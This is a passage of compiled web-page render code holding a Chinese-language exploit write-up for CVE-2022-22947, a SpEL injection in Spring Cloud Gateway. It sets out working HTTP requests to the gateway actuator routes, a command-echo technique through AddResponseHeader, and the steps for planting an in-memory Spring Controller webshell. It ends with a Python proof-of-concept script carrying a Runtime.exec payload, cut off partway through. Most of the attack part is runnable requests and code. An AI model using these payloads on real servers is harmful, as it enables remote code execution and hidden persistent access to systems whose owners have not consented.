org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SetResponseHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RewriteResponseHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RewriteLocationResponseHeaderGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SetStatusGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("SaveSessionGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("StripPrefixGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RequestHeaderToRequestUriGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RequestSizeGatewayFilterFactory\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" org"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("springframework"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cloud"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("gateway"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("filter")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("factory"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("RequestHeaderSizeGatewayFilterFactory\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br"),n("span",{staticClass:"line-number"},[t._v("20")]),n("br"),n("span",{staticClass:"line-number"},[t._v("21")]),n("br"),n("span",{staticClass:"line-number"},[t._v("22")]),n("br"),n("span",{staticClass:"line-number"},[t._v("23")]),n("br"),n("span",{staticClass:"line-number"},[t._v("24")]),n("br"),n("span",{staticClass:"line-number"},[t._v("25")]),n("br"),n("span",{staticClass:"line-number"},[t._v("26")]),n("br"),n("span",{staticClass:"line-number"},[t._v("27")]),n("br"),n("span",{staticClass:"line-number"},[t._v("28")]),n("br"),n("span",{staticClass:"line-number"},[t._v("29")]),n("br")])]),n("br"),t._v(" "),n("p",[t._v("可以随意选择其中的一个"),n("code",[t._v("GatewayFilterFactory")]),t._v("，比如利用"),n("code",[t._v("Retry")]),t._v("来修改请求包：")]),t._v(" "),n("div",{staticClass:"language-powershell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-powershell"}},[n("code",[t._v("POST "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("actuator/gateway/routes/123456 HTTP/1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1\nHost: 127"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1:9000\nAccept-Encoding: gzip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept: "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAccept-Language: en\nUser-Agent: Mozilla/5"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Windows NT 10"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Win64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" x64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit/537"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("36 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("KHTML"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome/97"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("4692"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("71 Safari/537"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("36\nConnection: close\nContent-"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("Type")]),t._v(": application/json\nContent-Length: 181\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"id"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"1234567"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"filters"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Retry"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"args"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"payload"')]),t._v("\n   "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"uri"')]),t._v(": "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://localhost"')]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br"),n("span",{staticClass:"line-number"},[t._v("20")]),n("br")])]),n("br"),t._v(" "),n("p",[t._v("请求后显示路由创建成功。可以通过refresh来生效：")]),t._v(" "),n("div",{staticClass:"language-json line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-json"}},[n("code",[t._v("POST /actuator/gateway/refresh HTTP/"),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),t._v("."),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.1")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("9000")]),t._v("\nConnection"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" close\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br")])]),n("br"),t._v(" "),n("p",[t._v("成功触发表达式解析：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1159),alt:"img"}})]),t._v(" "),n("h3",{attrs:{id:"武器化一-命令回显"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#武器化一-命令回显"}},[t._v("#")]),t._v(" "),n("strong",[t._v("武器化一：命令回显")])]),t._v(" "),n("p",[n("br"),t._v("通过调试发现，在refresh路由时会调用对应"),n("code",[t._v("GatewayFilter")]),t._v("的"),n("code",[t._v("apply")]),t._v("函数。当成功创建新的路由后，可以通过GET请求获取配置信息：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1160),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("回顾前面合法的"),n("code",[t._v("GatewayFilter")]),t._v("列表，我们发现存在一个名为"),n("code",[t._v("AddResponseHeaderGatewayFilterFactory")]),t._v("的子类：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1161),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1162),alt:"img"}})]),t._v(" "),n("p",[n("br"),n("code",[t._v("apply")]),t._v("函数会将配置信息写入HTTP响应数据包中，所以可以尝试利用"),n("code",[t._v("AddResponseHeaderGatewayFilterFactory")]),t._v("来构造命令回显请求：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1163),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("refresh执行SPEL表达式，将结果写入HTTP响应流，然后访问创建的路由，可以将命令执行的结果回显出来：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1164),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("最后可以发送DELETE请求将创建的新路由删除。")]),t._v(" "),n("h3",{attrs:{id:"武器化二-spring-controller内存马"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#武器化二-spring-controller内存马"}},[t._v("#")]),t._v(" 武器化二：Spring Controller内存马")]),t._v(" "),n("p",[n("br"),t._v("CVE-2022-22947是一个SPEL表达式注入漏洞，并且框架基于Spring Framework实现，所以我们考虑通过漏洞注入Spring内存马。Spring可以在Controller、Interceptor等不同层级构建不同的内存马")]),t._v(" "),n("div",{staticClass:"language-json line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-json"}},[n("code",[t._v("本文尝试构造Spring Controller内存马。Spring可以通过`RequestMappingHandlerMapping`来完成`@Contoller`和`@RequestMapping`注解，这里有两个比较关键的类：\n\n`RequestMappingInfo`：一个封装类，对一次http请求中的相关信息进行封装\n`HandlerMethod`：对Controller的处理请求方法的封装，里面包含了该方法所属的bean、method、参数等对象\n\n函数`RequestMappingHandlerMapping#registerHandlerMethod`可以将Controller函数与`RequestMappingInfo`对象关联起来。首先寻找`RequestMappingHandlerMapping`对象。我们可以尝试在内存中搜索，借助`java-object-searcher`搜索，结果如下：\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1165),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1166),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("除了上面通过"),n("code",[t._v("Thread")]),t._v("的方式提取"),n("code",[t._v("RequestMappingInfo")]),t._v("之外，通过观察SPEL表达式解析的代码发现上下文环境存在"),n("code",[t._v("beanFactory")]),t._v("的对象：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1167),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1168),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("存有337个Bean对象信息，可以利用下面代码辅助打印结果：")]),t._v(" "),n("div",{staticClass:"language-json line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-json"}},[n("code",[t._v("for(int i = "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("; i<((DefaultListableBeanFactory) beanFactory).beanDefinitionNames.toArray().length; i++)"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    System.out.println(((DefaultListableBeanFactory) beanFactory).beanDefinitionNames.toArray()"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("i"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(");\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1169),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1170),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("直接利用SPEL上线文环境中的"),n("code",[t._v("beanFactory")]),t._v("即可获取"),n("code",[t._v("RequestMappingHandlerMapping")]),t._v("对象。SPEL表达式中可以通过"),n("code",[t._v("@")]),t._v("来获取"),n("code",[t._v("BeanResolver")]),t._v("配置的beans对象：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1171),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("接下来创建内存马的过程就很简单了，最终效果就是将如下自定义的"),n("code",[t._v("Controller")]),t._v("子类通过SPEL表达式注入到内存并通过"),n("code",[t._v("RequestMappingHandlerMapping")]),t._v("对象完成路由注册：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1172),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("构造完新的payload后，发送数据包：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1173),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("refresh后将注入内存马：")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1174),alt:"img"}})]),t._v(" "),n("p",[n("br"),t._v("最后同样记得发送DELETE请求将创建的路由删除。")]),t._v(" "),n("h2",{attrs:{id:"漏洞poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[t._v("#")]),t._v(" 漏洞POC")]),t._v(" "),n("a-alert",{attrs:{type:"success",message:"https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947/blob/main/spring_cloud_RCE.py",description:"",showIcon:""}}),t._v(" "),n("br"),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" requests\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" json\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" sys\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\n    headers1 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Accept-Encoding'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'gzip, deflate'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Accept'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'*/*'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Accept-Language'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'en'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'User-Agent'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Content-Type'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'application/json'")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n    headers2 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'User-Agent'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Content-Type'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'application/x-www-form-urlencoded'")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v('## command to execute replace "id" in payload')]),t._v("\n\n    payload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[t._v('\'\'\'{\\r\n      "id": "hacktest",\\r\n      "filters": [{\\r\n        "name": "AddResponseHeader",\\r\n        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\\"id\\\\"}).getInputStream()))}"}\\r\n        }],\\r\n      "uri": "http://example.com",\\r\n      "order": 0\\r\n    }\'\'\'')]),t._v("\n\n   \n\n    \n    re1 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/actuator/gateway/routes/hacktest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("data"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("headers1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("json"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    re2 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/actuator/gateway/refresh"')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("headers2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    re3 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/actuator/gateway/routes/hacktest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("headers2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    re4 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("delete"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/actuator/gateway/routes/hacktest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("headers2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    re5 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("url 